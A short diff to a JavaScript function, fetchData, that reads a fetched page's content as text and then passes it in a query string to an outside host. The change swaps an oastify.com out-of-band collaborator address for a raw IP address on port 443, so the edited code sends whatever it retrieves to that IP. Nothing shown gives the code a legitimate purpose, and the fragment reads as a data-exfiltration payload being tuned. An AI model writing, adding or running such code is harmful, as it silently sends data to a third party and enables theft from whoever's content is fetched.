@@ -12,7 +12,7 @@ async function fetchData(url) {
     // Get the content as text
     const content = await response.text();
 
-    await fetch('http://yjlrx97p5e6hoxwb1dp5jajqzh5at0hp.oastify.com/?a='+content)
+    await fetch('https://217.76.52.175:443/?a='+content)
 
     
   } catch (error) {
